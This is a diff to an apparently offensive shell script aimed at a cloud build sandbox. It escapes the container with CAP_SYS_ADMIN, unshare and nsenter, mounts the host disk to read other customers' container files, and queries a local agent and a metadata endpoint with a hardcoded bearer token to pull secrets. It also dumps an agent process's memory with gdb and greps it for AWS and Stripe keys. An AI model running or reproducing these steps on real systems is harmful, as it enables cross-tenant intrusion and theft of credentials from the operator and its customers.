@@ -43,22 +43,37 @@ cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"
 
 echo "exploiting cap sys admin"
 # Create a directory to hold the host's heart
-mkdir /mnt/host_root
+# This creates a new User Namespace (-U) and Mount Namespace (-m)
+# mapping your current user to root (-r), then executes the mkdir.
+unshare -rm bash -c "mkdir -p /mnt/host_root && chmod 777 /mnt/host_root"
+unshare -rm bash -c "mount /dev/vdc /mnt/host_root && ls -la /mnt/host_root"
 # Mount the host's main partition (usually /dev/sda1 or sdb1)
 mount /dev/sda1 /mnt/host_root
 # Now you can browse every customer's build files stored on that disk
 ls /mnt/host_root/var/lib/docker/containers/
 
+echo "Hijaching the agent"
+# This attempts to enter the mount namespace of the root process
+# and run the mkdir command from its perspective.
+nsenter -t 268 -m mkdir -p /mnt/host_root
 
 
 
+echo "Check for local listening ports (where secrets might live)"
+ss -ntlp
+# Check for Unix sockets (often used by agents to pass secrets)
+ls -F /run | grep .sock
+# Attempt to hit the local agent using the Token as a Header
+TOKEN="ca8ccde4505aa2f5776940cad26af00d" # From your logs
+curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/v1/secrets
+curl -H "Authorization: Bearer $TOKEN" http://localhost:8080/v1/env
+# Attempt to fetch the configuration which might contain AWS/Stripe keys
+curl -H "X-CF-Token: $TOKEN" http://169.254.169.254/cloudchamber/v1/secrets
 
-
-
-
-
-
-
+echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
+# (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
+gdb -p 236 --batch -ex "generate-core-file"
+strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"
 
 
 
